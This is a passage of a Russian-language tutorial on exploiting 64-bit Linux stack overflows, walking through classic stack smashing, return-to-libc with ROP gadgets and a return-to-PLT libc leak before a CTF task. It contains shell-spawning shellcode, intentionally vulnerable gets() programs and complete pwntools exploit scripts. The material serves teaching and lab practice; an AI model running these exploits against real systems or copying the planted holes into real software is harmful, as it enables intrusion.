turn‐to‐PLT, или  ret2plt) для обхо да ASLR без необходимости запускать
перебор. DEP/NX и ASLR активны.
  От последнего этапа мы перейдем непосредс твенно к исследованию Bit‐
terman, который к этому моменту уже не будет представлять для тебя слож‐
ности.


Стенд
Для этой статьи я установил свежую 64‐битную Ubuntu 19.10 с GCC вер‐
сии 8.3.0.



  $ uname ‐a
  Linux pwn‐3 5.0.0‐31‐generic #33‐Ubuntu SMP Mon Sep 30 18:51:59 UTC 2019
  x86_64 x86_64 x86_64 GNU/Linux


Из дополнительного ПО я взял интерпретатор Python 2.7, который перестали
поставлять по умол чанию с дистрибутивом (все переходят на третью версию
Python).



  $ sudo apt install python2.7 ‐y
  $ sudo update‐alternatives ‐‐install /usr/bin/python2 python2
  /usr/bin/python2.7 1


Вторая версия пригодится нам для модуля pwntools, который мы поставим
чуть позже.


         GDBВоору жение
В прошлых статьях мы использовали PEDA в качестве основного обве са
для дебаггера, однако я знал, что уже есть более продвинутые тул зы
для апгрейда GDB (к тому же PEDA больше не поддерживается разработ‐
чиком), а именно GEF и pwndbg. Изучая эти инстру менты, я нашел изоб‐
ретательный пост, в котором рас ска зывается, как одновременно установить
эти софтины и переключать ся между ними одним нажатием. Мне понравилась
идея, но не реализация, поэто му я наб росал свой скрипт, позволяющий
в одно действие инсталлировать все три ассистента. Теперь каждый из них
будет запускаться сле дующими командами соответственно.


 $ gdb‐peda [ELF‐файл]
 $ gdb‐gef [ELF‐файл]
 $ gdb‐pwndbg [ELF‐файл]


Для этой статьи мы продолжим юзать PEDA, потому что с ним удобнее все го
делать скриншоты.



Кейс 1. Классический срыв сте ка
Уязвимый исходный код.


/**
 * Buffer Overflow (64‐bit). Case 1: Classic Stack Smashing
 * Compile: gcc ‐g ‐fno‐stack‐protector ‐z execstack ‐no‐pie ‐o
classic classic.c
 * ASLR: Off (sudo sh ‐c 'echo 0 > /proc/sys/kernel/randomize_va_sp
ace')
 */


#include <stdio.h>


void vuln() {
  char buffer[100];
  gets(buffer);
}


int main(int argc, char* argv[]) {
  puts("Buffer Overflow (64‐bit). Case 1: Classic Stack Smashing\n");
  vuln();


  return 0;
}

В наших изысканиях всему виной будет функция vuln, содержащая вызов уяз‐
вимой процедуры чтения из буфера gets, которая уже стала эталоном
небезопасного кода.



      Never use gets(). Because it is impossible to tell without knowing the data
        in advance how many characters gets() will read, and because gets() will
       continue to store characters past the end of the buffer,  it  is extremely
      dangerous to use.  It has been used to break computer security. Use
        fgets() instead.

Как видишь, даже man кричит о том, что ни в каких случаях не следует исполь‐
зовать gets, ведь этой функции наплевать на раз мер переданного ей
буфера — она прочитает из него все, пока содержимое не кончится.
  Скомпилируем  программу без  запрета исполнения данных  в  стеке
и отклю чим ASLR.



  $ gcc ‐g ‐fno‐stack‐protector ‐z execstack ‐no‐pie ‐o classic classic.c
  $ sudo sh ‐c 'echo 0 > /proc/sys/kernel/randomize_va_space'





       Подготовка исполня емо го файла classic для первого кей са

Получив порцию негодования от GCC из‐за использования gets, мы соб‐
рали 64‐битный исполня емый файл classic.





         Проверка безопасности исполняемо го файла classic

Скрипт checksec.py, иду щий в комплекте с модулем pwntools и доступный
из командной строки, говорит о том, что бинарь никак не защищен. Это нам
и нужно для демонстрации первого кей са.
  Запустим отладчик и попробуем получить контроль над регистром RIP (он
отвечает за хранение адреса воз врата) в момент завершения работы фун‐
кции vuln.


                             x86-64Некото рые изме нения в логике
Регистры процессора:
 • все регистры обще го назначения рас ширены до 64 бит: EAX>RAX, EBX>
  RBX, ECX>RCX, EDX>RDX, ESI>RSI, EDI>RDI, EBP>RBP (база сте‐
   кового кадра), ESP>RSP (вершина стека);
 • введено восемь дополнительных регистров общего назначения: R8..R15;
 • служебный регистр — указатель на текущую исполняемую команду также
   расширен до 64 бит: EIP>RIP.

Память:
 • размер указателя стал равен восьми байтам;
 • инструкции работы со стеком push и pop опериру ют значени ями раз‐
  мером восемь байт;
 • каноническая  форма   адреса   виртуальной   памяти  имеет   вид
  0x00007FFFFFFFFFFF (то есть, в сущ ности, используются только шесть
   наименьших значащих байт).

Функции:
 • аргументы для функций теперь раз мещаются в регистрах и в стеке. Пер‐
   вые шесть аргументов подаются через регистры в порядке RDI, RSI,
  RDX, RCX, R8, R9 , последу ющие помеща ются в стек.

Хорошее чтиво по теме: What happened when it goes to 64 bit?



Proof-of-concept
Как обычно, будем поль зоваться pattern create, чтобы сге нерировать цик‐
лический паттерн де Брёйна, который мы скормим программе.





                 Создание циклического паттерна

Этим действием, как и планировалось, мы вышли за границы отведенного
буфера.





       Перепол нение буфера и вызов процессорного исключения

Однако несмотря на то, что отрывки нашего пат терна можно наблюдать
на стеке (синий), адрес возврата (красный) переза писать не удалось. Все му
виной каноническая форма виртуальной адресации (0x00007FFFFFFFFFFF),
где задействованы лишь младшие 48 бит (6 байт). В том слу чае, если процес‐
сор видит «неканонический» адрес (в котором первые два значащих байта
отличны от нуля), будет вызвано исклю чение, и контроля над RIP мы точно
не получим.
   Чтобы перезапись уда лась, пос мотрим, что находится в RSP, и пос читаем
смещение.




                      Рас чет смещения до RIP

Нам нужно 120 байт, чтобы добрать ся до RIP. Исходя из этого, напишем
небольшой PoC‐скрипт на Python, демонс трирующий возможность переза‐
писи адреса возврата.


#!/usr/bin/env python2
# ‐*‐ coding: utf‐8 ‐*‐


# Использование: python pwn‐classic‐poc.py


import struct


def little_endian(num):
  """Упаковка адреса в формат little‐endian (x64)."""
  return struct.pack('<Q', num)


junk = 'A' * 120
ret_addr = little_endian(0xd34dc0d3)
payload = junk + ret_addr


with open('payload.bin', 'wb') as f:
  f.write(payload)

Квалификатор <Q упакует нужный адрес в 64‐битный формат little‐endian.





              Успешная переза пись RIP «мертвым кодом»

Таким образом, RIP поддается для переза писи произвольным значением.


Бо евой пейлоад
Чтобы не мучиться с вычислением адреса загрузки шелл‐кода в стеке, вос‐
пользуемся тех никой размещения полезной нагрузки в переменной окру‐
жения.
  Идея вкратце: адрес любой переменной окру жения может быть найден
с помощью простой прог раммы на C (функция getenv), следовательно, если
разместить в такой переменной шелл‐код, то можно точно узнать его адрес,
что избавляет хакера от необ ходимости возиться с NOP‐сре зами. Интересно
то, что на расположение шелл‐кода относитель но сте кового прос транства
программы влияет ее имя.


             INFO

                     Подробнее об этой технике читай в книге Hack‐
                             ing: The Art of Exploitation, PDF, с. 142.


Клонируем репозиторий с нужным исходником, соберем программу и ини‐
циализируем переменную окружения SHELLCODE этой нагрузкой (29 байт).



  $ git clone https://github.com/historypeats/getenvaddr tmp
  $ mv tmp/getenvaddr.c .
  $ gcc ‐o getenvaddr getenvaddr.c
  $ rm ‐rf tmp/ getenvaddr.c
  $ export SHELLCODE=python ‐c 'print "\x6a\x42\x58\xfe\xc4\x48\x99\x52\
  x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\
  xd2\x0f\x05"'


После чего узнаем адрес SHELLCODE.



  $ ./getenvaddr SHELLCODE classic
  SHELLCODE will be at 0x7fffffffe3f8


Немного подкорректируем скрипт, и у нас все готово для эксплуатации!


#!/usr/bin/env python2
# ‐*‐ coding: utf‐8 ‐*‐


# Использование: python pwn‐classic.py


import struct


def little_endian(num):
  """Упаковка адреса в формат little‐endian (x64)."""
  return struct.pack('<Q', num)


junk = 'A' * 120
ret_addr = little_endian(0x7fffffffe3f8)
payload = junk + ret_addr


with open('payload.bin', 'wb') as f:
  f.write(payload)





               Отправка пейлоада и получение шелла

Обрати внимание на использование конструкции cat payload.bin; echo;
cat с идущей за ней конвейерной переда чей. Это нужно, чтобы поток ввода
stdin оставался открытым после отправки пей лоада и мы смогли вводить
команды.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
            PWN В КОРОЛЕВСТВЕ
              ROP‐ЦЕПОЧКИ И АТАКА RETURN‐TO‐PLT
                             В CTF BITTERMAN





Кейс 2. Return-to-libc
Уязвимый исходный код.


/**
 * Buffer Overflow (64‐bit). Case 2: Return‐to‐libc
 * Compile: gcc ‐g ‐fno‐stack‐protector ‐no‐pie ‐o ret2libc ret2libc.
c
 * ASLR: Off (sudo sh ‐c 'echo 0 > /proc/sys/kernel/randomize_va_sp
ace')
 */


#include <stdio.h>


void rop_gadgets() {
  asm("pop %rdi; ret");
  asm("nop; ret");
  asm("ret");
}


void vuln() {
  char buffer[100];
  gets(buffer);
}


int main(int argc, char* argv[]) {
  puts("Buffer Overflow (64‐bit). Case 2: Return‐to‐libc\n");
  vuln();


  return 0;
}

Исходник изменился только в одном — добавилась вспомогательная функция
rop_gadgets с ассемблерными  вставками, о предназначении  которой
поговорим далее.
  При компиляции чес тно отка жемся от настройки ‐z execstack, отклю‐
чающей DEP/NX.



  $ gcc ‐g ‐fno‐stack‐protector ‐no‐pie ‐o ret2libc ret2libc.c
  $ sudo sh ‐c 'echo 0 > /proc/sys/kernel/randomize_va_space'





       Подготовка исполня емо го файла ret2libc для второго кейса


ROP-цепоч ки
Единственное существенное отличие 64‐битной «версии» атаки  ret2libc
от ее 32‐разрядной предшественницы заключа ется в том, что аргумент
для библиотечной функции system (строка "/bin/sh") пушится не в стек,
а помещается в регистр RDI. В связи с этим возникает логичный вопрос:
как изменить поведение программы таким обра зом, чтобы в нужный момент
она записала адрес "/bin/sh" в RDI?
   Здесь нам на помощь и приходит широко извес тная концепция воз врат‐
но‐ориентированного  программирова ния  (ROP),  которая  заключается
в «переиспользовании» существующих в памяти машинных инструкций. К сло‐
ву, Return‐to‐libc, по сути, всего лишь час тный случай ROP.



      «Видишь, как все прос то? Процес сор — это глу пый кусок крем ния: он
      все го лишь выполняет прос тейшие опе рации с крохотными пор циями
      байтов» — фра за из ра боты француз ского иссле дова теля Жюльена
      Паули, которая отлично под ходит к нашему слу чаю.

Язык ассембле ра, по сути, представляет собой набор мнемоник для опкодов
процессора — символические представления машинных инструкций. Но сам
процессор (глупый кусок кремния) не спо собен оценить уместность выпол‐
нения той или иной инструкции в текущем контексте — он просто выполнит
опкод, на который указыва ет регистр RIP в данный момент. Поэтому, если
где‐то в обозримой памяти процесса существу ет инс трукция, содержащая
байт 5f, за которым следует c3, про цес сор выпол нит pop rdi; ret, если
«ткнуть его носом» в нужное смещение (ведь 5fc3 оз начает не что иное,
как pop rdi; ret).





  Ассемблирование инс трукций в HEX‐код (defuse.ca/online‐x86‐
  assembler)

С помощью xxd, к примеру, можно найти все смещения в нашем исполня‐
емом файле, по которым рас положена нуж ная цепочка бай тов (или, по‐дру‐
гому, «ROP‐гаджет»).



  $ xxd ‐c1 ret2libc | grep ‐A1 ' 5f' | grep ‐B1 ' c3'
  00001136: 5f  _
  00001137: c3  .
  ‐‐
  000011eb: 5f  _
  000011ec: c3  .


Конечно, такой подход к поиску гаджетов не самый удобный, поэтому сущес‐
твует не один инструмент, позволяющий автоматизировать процесс. Не счи‐
тая темной магии pwntools, к которой мы вернемся при решении Bitterman,
на ум приходят три способа генера ции ROP‐цепочек:
 • с помощью мощ ного  Unix‐like‐фрей мворка  для  реверс‐инжиниринга
   Radare2;
 • с помощью проекта ROPgadget автора уже известного нам блога shell‐
   storm.org;
 • с помощью прямого наследника ROPgadget — более универсального инс‐
   трумента Ropper.

Попробуем каждый из них в деле. Так выглядит поиск ROP‐чейнов с помощью
Radare2.



  $ r2 ret2libc
  [0x00401050]> /R pop rdi





             Поиск ROP‐гаджетов при помощи Radare2

В арсенале ROPgadget есть удобная опция depth, которая позволя ет задать
максимальное количество звень ев в искомой цепочке.



  $ ROPgadget ‐‐binary ret2libc ‐‐ropchain ‐‐rawArch=x86‐64 ‐‐depth 2 |
  grep 'pop rdi ; ret'
  $ ROPgadget ‐‐binary ret2libc ‐‐opcode 5fc3





            Поиск ROP‐гаджетов при помощи ROPgadget

А Ropper понимает регулярные выражения и может быть использован
не только для поиска гаджетов.



  $ ropper ‐‐file ret2libc ‐‐arch x86_64 ‐‐search 'pop ?di; ret'
  $ ropper ‐‐file ret2libc ‐‐arch x86_64 ‐‐disasm 5fc3





             Поиск ROP‐гаджетов при помощи Ropper

Сколько утилит, столько и ответов — тебе решать, чем пользоваться. Однако
об одном  из найденных  гаджетов  (том,  что  находится по смещению
0x401136) мнения всех трех инс трументов сош лись. Если обратить внимание
на вывод xxd, то можно видеть то же смещение 0x001136, благодаря чему
напрашивается вывод, что базовый адрес загрузки программы — 0x400000.
Проверить это можно с помощью readelf.



  $ readelf ‐l ret2libc | grep ‐m1 LOAD
  LOAD 0x0000000000000000 0x0000000000400000 0x0000000000400000


Предполагаю, что именно в это место в исполняемом файле была ском‐
пилирована  встав ка asm("pop  %rdi;  ret") из функции rop_gadgets
исходного  кода, назначение которой, думаю, уже стало очевид ным —
это «читерская» функция‐помощник, благода ря наличию которой я точно уве‐
рен, что найду нужный гаджет в бинарнике.


        ROPЗащита от
Долгое время единственной защитой от ROP‐атак был механизм ASLR. Одна‐
ко часто он не становится значимым препятстви ем для нарушителя: можно
перебрать адрес libc методом грубой силы (если речь идет о 32‐битных сис‐
темах) или воспользоваться несовершенс твом написанного кода и исполь‐
зовать библиотеч ные функции так, чтобы спровоцировать утечку памяти (как
будет показано на примере заключительного трениро вочного кейса).
  Специалисты по  компьютерной  безопас ности  IT‐гигантов  стре мятся
устранить возможность таких атак, это можно наб людать на при мере попыток
воплотить в жизнь концепцию CFI (Control‐ﬂow integrity) — как на аппаратном
уровне (CET фирмы Intel), так и на софтверном (XGuard CFI авторства Karam‐
ba Security).



Раз работка спло ита
Итак, мы остановились на том, что был скомпилирован исполняемый файл
ret2libc. Вот что говорит о нем checksec.





         Проверка безопасности исполняемо го файла ret2libc

DEP включен, все по плану.
  Пейлоад для PWN ret2libc будет иметь при мерно такой вид.


ПЕЙЛОАД =
  (1) МУСОР_120_байт +
  (2) ГАДЖЕТ_pop_rdi +
  (3) СТРОКА_bin_sh +
  (4) АДРЕС_system +
  (5) АДРЕС_exit

 1. Через 120‐байтовое заполнение мы доберемся до точки перезаписи
   регистра RIP.
 2. ROP‐гаджет pop rdi; ret положит в регистр RDI (где функция system
   будет искать свой первый аргумент) зна чение, которое лежит на вершине
   стека (строку "/bin/sh" из пункта 3), и передаст управление следующей
   инструкции (вызов system из пункта 4).
 3. Тот самый аргумент для system, который окажется в RSP на момент
   выполнения pop rdi.
 4. Собственно, гвоздь программы — функция system из  libc, которая
   подарит нам шелл.
 5. Функция exit из libc, которая перехватит управление после того, как мы
   наиграемся с шеллом, и не поз волит прог рамме завершиться ошибкой
   сегментации.

Так как для наших экспериментов используется функция gets, которая уме ет
читать нулевые байты (в отличие от strcpy, например), можно не беспокоить‐
ся о конкатенации разных частей пейлоада.
   Теперь самое время поз накомиться с питоновским модулем pwntools,
призванным превратить разработ ку низкоуровневых экс плоитов в одно удо‐
вольствие.


Pwntools
Pwntools — сторонний модуль для Python, разрабаты ваемый специально
для примене ния в CTF‐кампаниях для тас ков категории PWN. Его авторы сов‐
сем не следовали философии Unix, поэтому pwntools уме ет делать много, но,
как ни странно, делает все это хорошо.
   Установка сво дится к прос той команде менеджеру пакетов. Мы будем ста‐
вить stable‐версию (для Python 2). Хоть разработ чики уже и выпустили бету
pwntools для Python 3, багов там все еще слишком много, чтобы нормально
ей пользоваться (в основном трудности с раз личиями в механизмах работы
с кодировками).


 $ sudo ‐H python2 ‐m pip install ‐‐upgrade pwntools


Имей в виду, что в довесок к самому модулю будет установлена туча сторон‐
них  зависимостей,  поэто му  я бы  не  рекомендовал  ставить  pwntools
на основном хосте не из виртуальной среды.
  Ссылка на информативную документацию  (которая, впрочем, иногда
не открывается без VPN): docs.pwntools.com.


Работать с модулем несложно, а код получа ется интуитивно понятным, поэто‐
му я прокомментирую только основные моменты.


#!/usr/bin/env python2
# ‐*‐ coding: utf‐8 ‐*‐


# Использование: python pwn‐ret2libc.py [DEBUG]


from pwn import *


context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 64
context.terminal  = ['tmux', 'new‐window']


junk = 'A' * 120
pop_rdi_gadget = p64(0x401136)
system_addr = p64(0x7ffff7e1ffd0)
bin_sh_addr = p64(0x7ffff7f7cb84)
exit_addr = p64(0x7ffff7e143c0)


payload = junk + pop_rdi_gadget + bin_sh_addr + system_addr + exit_a
ddr


with open('payload.bin', 'wb') as f:
  f.write(payload)


p = process('./ret2libc')


"""
gdb.attach(p, '''
init‐peda
start''')


# Нужен raw_input(), когда юзаешь gdb.debug() вместо gdb.attach()
"""


p.recvuntil('Case 2: Return‐to‐libc')
raw_input('[?] Отправляю пейлоад?')
p.sendline(payload)


p.interactive()

 • Строки 6–12: первым делом импорти руем модуль и задаем основные нас‐
   тройки окружения. Удоб но, что есть поддержка tmux, благодаря которой
   pwntools умеет открывать отладчик в новом окне.
 • Строки 14–23: фор миру ется полезная нагрузка, шаблон которой мы обсу‐
   дили выше. Смещение ROP‐гаджета уже было найдено, а адре са осталь‐
   ных частей пейлоада можно добыть с помощью отладчи ка, как мы делали
   это здесь. Функция p64, как ты мог догадаться, выполняет то же самое,
   что и little_endian в спло ите из первого кей са.
 • Cтроки 25 и 35–39: непосредственно взаимодействие с исполня емым
  файлом — отправка пейлоада и переход в интерактивный режим для вза‐
  имодействия с полученным шеллом.
 • Строки 27–33: работа с отладчиком на этапе раз работки. Это очень
   помогает отлавливать свои ошибки при тес тирова нии эксплоита.

Попробуем запустить на исполнение.





             Первая попытка запуска экспло ита (провал)

Шелл мы не получили, и, как можно видеть, процесс упал с сегфолтом. Если
запустить скрипт с параметром DEBUG, можно получить больше фид бэка
от pwntools.





                  То же самое, но с опци ей DEBUG

Это не прояснило ситуацию, поэто му пойдем в отладчик смотреть, что же
на самом деле происхо дит. Поставим точку оста нова на возврате из функции
vuln, скормим бинарнику содержимое файла payload.bin, куда мы записали
пейлоад, и сделаем шаг вперед.



  gdb‐peda$ b *0x401159
  gdb‐peda$ r < payload.bin
  gdb‐peda$ si





        Подготовка к выполнению первой части гаджета (pop rdi)

На этом этапе RIP указывает на первую инс трукцию нашего гаджета pop rdi,
а в RSP находится строка "/bin/sh", которая через мгновение окажется
в RDI.



  gdb‐peda$ si





          Подготов ка к выполнению второй части гаджета (ret)

После перехода к следующей инструкции в RIP ока залась оставшаяся часть
ROP‐гаджета ret, а RSP теперь ука зывает на system, куда и будет передано
управление.  Обрати   внимание   на   зна чение   указателя   в  RSP
(0x7fffffffded8) — оно станет ключом к пониманию проблемы.



  gdb‐peda$ si





                   Ошибка сегмента ции

И вот здесь программа кра шится. В чем дело?
  Все просто: начиная с Ununtu 18.04 и по текущий релиз (19.10) в дистри‐
бутиве используется версия библиотеки GLIBC, содержащая инструкцию
movaps в реализации некоторых функций — в том числе do_system (ядро
функции system). В 64‐битном ассемблере эта инструкция тре бует, чтобы
стек был выровнен на 16‐байтную гра ницу при передаче управле ния таким
функциям. «Выровнен на 16‐байтную границу» — то же самое, что «значение
RSP делится на 0x10», а у нас это значение равно 0x7fffffffded8. Под‐
робности об этой особенности можно най ти в посте по ключевой фразе
The MOVAPS issue.
  Решение тривиально: добавить к нашему пейлоаду гаджет с инструкцией
NOP (nop; ret) или прос то еще один ret. Это увеличит стек на одну ячейку
(8 байт), тем самым уменьшив зна чение адреса его вершины (так как стек
растет вниз). Имен но столько нам нужно, чтобы значение RSP делилось
на 0x10: 0x7fffffffded8 ‐ 0x8 = 0x7fffffffded0.
  Найдем местополо жение гаджета с NOP.



  $ ropper ‐‐file ret2libc ‐‐arch x86_64 ‐‐search 'nop; ret'
  [INFO] Load gadgets from cache
  [LOAD] loading... 100%
  [LOAD] removing double gadgets... 100%
  [INFO] Searching for gadgets: nop; ret


  [INFO] File: ret2libc
  0x00000000004010af: nop; ret;


И модифицируем наш пейлоад.


...
nop_gadget = p64(0x4010af)
payload = junk + pop_rdi_gadget + bin_sh_addr + nop_gadget + system
_addr + exit_addr
...

Теперь все работает как нужно, и я получаю честно заработанный шелл.





               Вторая попытка запус ка экс плоита (успех)



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

            PWN В КОРОЛЕВСТВЕ
              ROP‐ЦЕПОЧКИ И АТАКА RETURN‐TO‐PLT
                             В CTF BITTERMAN





Кейс 3. Return-to-PLT
Уязвимый исходный код.


/**
 * Buffer Overflow (64‐bit). Case 3: Return‐to‐PLT
 * Compile: gcc ‐g ‐fno‐stack‐protector ‐no‐pie ‐o ret2plt ret2plt.c
 * ASLR: On
 */


#include <stdio.h>


void rop_gadgets() {
  asm("pop %rdi; ret");
  asm("nop; ret");
  asm("ret");
}


void vuln() {
  char buffer[100];
  gets(buffer);
}


int main(int argc, char* argv[]) {
  puts("Buffer Overflow (64‐bit). Case 3: Return‐to‐PLT\n");
  vuln();


  return 0;
}

Исходник не изменился с прошлого раза, если не считать название кейса.
Соберем и активируем ASLR.



  $ gcc ‐g ‐fno‐stack‐protector ‐no‐pie ‐o ret2plt ret2plt.c
  $ sudo sh ‐c 'echo 2 > /proc/sys/kernel/randomize_va_space'





       Подготовка исполня емо го файла ret2plt для третьего кейса

Мнение checksec об исполня емом файле.





          Проверка безопасности исполняемо го файла ret2plt

Так как включен механизм рандомиза ции ASLR, адрес libc будет меняться
с каждым вызовом программы. Но раз ве нас ког да‐нибудь пугали трудности?


Как «слить» адрес libc и ничего не заметить
Ключом к пониманию Return‐to‐PLT и некоторых смежных с ней типов атак
(например, GOT Overwrite) служит знание стро ения секций .plt (.got.plt)
и .got (.plt.got).


PLT и GOT
Файл ELF, как ты знаешь, разделен на секции, часть из которых содержат
необходимую информацию (в виде таб лиц поис ка) для процедуры перераз‐
мещения (relocations) адресного прос транства. Многие функции исполняемо‐
го файла не зашиты непос редственно в бинарник, а подгружаются компонов‐
щиком динамически из разделяемых биб лиотек (типа libc) при работе про‐
цесса. Вместо того чтобы хранить захардкоженные адре са этих функций (что
было бы бессмысленно по раз ным при чинам — из‐за активнос ти того же
ASLR, к примеру), в ELF на мес то этих функций помещаются специальные
«заглушки», которые резолвятся позже. Здесь на помощь и приходят
переразмещения.
  PLT (Procedure Linkage Table) — таб лица компоновки процедур, исполь‐
зуемая для вызовов таких «внешних» функций. Она содержит те самые «заг‐
лушки» (спе циальные вспомога тельные функции), которые в зависимости
от ситуации либо прыгают на код реальных функций, либо обращаются к ком‐
поновщику, чтобы это сделал он. В последнем случае (когда неизвестная
функция встречается в исполняемом файле впервые), «заглушка» тре вожит
компоновщик, чтобы тот пришел на помощь и помог отыскать настоящий
адрес неизвестной функции.
  GOT (Global Oﬀset Table) — гло бальная таб лица сме щений, содержащая
реальные адреса неизвестных сущностей, которые загружаются динамичес ки
в процессе исполнения. После того как компоновщик уже однажды нашел
внешнюю функцию, ее смещение заносится в GOT (и перезаписы вает то, что
было там раньше), чтобы не инициировать поиск повторно.
  Про PLT и GOT можно говорить долго, это тема отдельной статьи. Вот
хорошие материалы, которые освещают тему более подробно:
 • PLT and GOT — the key to code sharing and dynamic libraries;
 • GOT and PLT for pwning.



Основная идея заключается в том, что в некоторых случаях, когда программа
выводит что‐то на экран, есть шанс вытащить из нее тот самый (случайный)
адрес загрузки разделяемой библиотеки проз рачно для самой программы.
Это сработает, когда в роли функции печати на экран выступает puts. Мы
достигнем этого, вызвав «заглушку» функции puts, в качестве аргумента
для которой будет использовано зна чение из GOT. Так как puts еще не был
найден к этому моменту, компоновщик сделает это за нас, а puts выведет
адрес самой себя на экран, и мы сможем посчитать смещение до начала libc.
Все будет более понятно, когда мы про делаем это на практике.
  В  упрощенном  виде  продемонстрировать  то,  что мы  собираемся
вытащить из исполняемого файла, можно с помощью три виального proof‐of‐
concept на C.


// gcc ‐o poc‐ret2plt poc‐ret2plt.c


#include <stdio.h>


int main(int argc, char* argv[]) {
  char addr[16];
  sprintf(addr, "%p", &puts);
  puts(addr);


  return 0;
}





              Вывод на экран адреса функции puts

Как можно видеть, адрес puts меня ется с каждым вызовом программы.
Таким образом, наша атака будет сос тоять из двух фаз.
 1. Получение «слитого» адреса puts в libc, расчет реального адре са заг‐
   рузки библиотеки как LIBC_start_main  =  СЛИТЫЙ_адрес_puts  
  СМЕЩЕНИЕ_puts_относительно_libc и перезапуск программы прыж‐
   ком на функцию main.
 2. Расчет реальных адресов функций system, exit и строки "/bin/sh" (с
  помощью добыто го в первой фазе адреса заг рузки libc) и выполнение
   классической 64‐битной атаки ret2libc аналогично примеру из второго
   кейса.

Пейлоад для первой фазы будет иметь такой вид.


ПЕЙЛОАД =
  (1) МУСОР_120_байт +
  (2) ГАДЖЕТ_pop_rdi +
  (3) GOT_puts +
  (4) PLT_puts +
  (5) АДРЕС_main

А для второй, соответственно, такой.


ПЕЙЛОАД2 =
  (1) МУСОР_120_байт +
  (2) ГАДЖЕТ_pop_rdi +
  (3) СТРОКА_bin_sh +
  (4) ГАДЖЕТ_nop +
  (5) АДРЕС_system +
  (6) АДРЕС_exit


Сбор адре сов и конеч ный экспло ит
Все необходимые адреса и смещения можно найти, выполнив все го пять
команд. Я не останавливаюсь здесь слишком подробно, потому что все
это мы уже делали.



  $ ropper ‐‐file ret2plt ‐‐arch x86_64 ‐‐search 'pop rdi; ret'
  $ ropper ‐‐file ret2plt ‐‐arch x86_64 ‐‐search 'nop; ret'
  $ objdump ‐D ret2plt | grep ‐e 'puts' ‐e '<main>'
  $ readelf ‐s /usr/lib/x86_64‐linux‐gnu/libc.so.6 | grep ‐e ' puts@' ‐e '
  system@' ‐e ' exit@'
  $ strings ‐atx /usr/lib/x86_64‐linux‐gnu/libc.so.6 | grep '/bin/sh'





               Собираем информа цию для сплоита

На рисунке имена значениям я присвоил такие же, как в теле кода экс плоита.


#!/usr/bin/env python2
# ‐*‐ coding: utf‐8 ‐*‐


# Использование: python pwn‐ret2plt.py [DEBUG]


from pwn import *
import time


context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 64
context.terminal  = ['tmux', 'new‐window']


junk = 'A' * 120
pop_rdi_gadget = p64(0x401136)
nop_gadget = p64(0x4010af)
puts_plt = p64(0x401030)
puts_got = p64(0x404018)
main_offset = p64(0x40115a)


payload = junk + pop_rdi_gadget + puts_got + puts_plt + main_offset


p = process('./ret2plt')


"""
gdb.attach(p, '''
init‐peda
start''')


# Нужен raw_input(), когда юзаешь gdb.debug() вместо gdb.attach()
"""


p.recvuntil('Case 3: Return‐to‐PLT')
raw_input('[?] (1‐я фаза) Отправляю пейлоад?')
p.clean()
p.sendline(payload)
received = p.recvuntil('Case 3: Return‐to‐PLT')[:6].strip()
leaked_puts = u64(received.ljust(8, '\x00'))
log.success('(1‐я фаза) Слитый адрес puts@GLIBC (./ret2plt): %s' %
hex(leaked_puts))


puts_offset = 0x83cc0
libc_start = leaked_puts ‐ puts_offset
log.success('(1‐я фаза) Вычислен адрес __libc_start_main (libc): %s'
% hex(libc_start))


system_offset = 0x52fd0
bin_sh_offset = 0x1afb84
exit_offset = 0x473c0


system_addr = libc_start + system_offset
log.success('(2‐я фаза) Вычислен адрес system (libc): %s' % hex(
system_addr))


bin_sh_addr = libc_start + bin_sh_offset
log.success('(2‐я фаза) Вычислен адрес "/bin/sh" (libc): %s' % hex(
bin_sh_addr))


exit_addr = libc_start + exit_offset
log.success('(2‐я фаза) Вычислен адрес exit (libc): %s' % hex(exit_a
ddr))


system_addr = p64(system_addr)
bin_sh_addr = p64(bin_sh_addr)
exit_addr = p64(exit_addr)


payload2 = junk + pop_rdi_gadget + bin_sh_addr + nop_gadget + system
_addr + exit_addr


#p.recvuntil('Case 3: Return‐to‐PLT')
raw_input('[?] (2‐я фаза) Отправляю пейлоад?')
p.clean()
p.sendline(payload2)


p.clean()
p.interactive()

Раз — и у нас уже есть шелл!





                       Получа ем шелл


Что, если вер сия libc неиз вес тна?
Как быть, если у тебя нет дос тупа к используемой биб лиоте ке libc? Как в этом
случае узнать нужные смещения, ведь они раз личны для разных версий?
  В этом случае спасет про ект libc‐database, который аккумулирует все вер‐
сии libc и позволяет выполнять поиск по ним. Можно загрузить и собрать базу
локально, а можно воспользоваться веб‐версией.
   Так как рандомизация памяти работает на страничном уровне, пос‐
ледние 12 бит (три символа) смещения, как правило, остаются неизменными,
что позволяет по «слитому» адресу функции puts угадать версию биб лиотеки.





         Узнаем версию libc по адресу функции puts (libc.blukat.me)

Если скачать предложенную версию и проверить хеш‐суммы, то окажется, что
это и правда та же самая биб лиотека, которая используется на моем стенде.


 $ wget ‐q https://libc.blukat.me/d/libc6_2.29‐0ubuntu2_amd64.so
 $ md5sum libc6_2.29‐0ubuntu2_amd64.so /usr/lib/x86_64‐linux‐gnu/libc
 .so.6
 2fb0d6800d4d79ffdc7a388d7fe6aea0  libc6_2.29‐0ubuntu2_amd64.so
 2fb0d6800d4d79ffdc7a388d7fe6aea0  /usr/lib/x86_64‐linux‐gnu/libc.so.
 6





BITTERMAN

     Can you exploit this one for me? bitterman is running on localhost:10103
       This time NX is enabled, to make sure it’s not too easy. Here’s the libc.

Примерно так выглядело усло вие к оригинальному таску Bitterman. Разве что
URL, на котором хостился бинарь, был другим.
  Для аутентичности переместимся на Kali, заг рузим исполняемый файл
и проведем быстрый анализ.





                            Bitterman в действии

Как можно видеть, вся функциональность этой вежливой программы сводится
к приветствию, запросу длины вводимой пользователем строки и собственно
самой  строки. Методом  тыка  выясняем,  что  последний  ввод  уязвим
к переполнению буфера.





        Ошибка сегмента ции при вводе стро ки большой длины



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 В КОРОЛЕВСТВЕ PWN
              ROP‐ЦЕПОЧКИ И АТАКА RETURN‐TO‐PLT
                             В CTF BITTERMAN





Статический анализ
Посмотрим на функцию main после дизассемблирования в Radare2.



  $ r2 ./bitterman
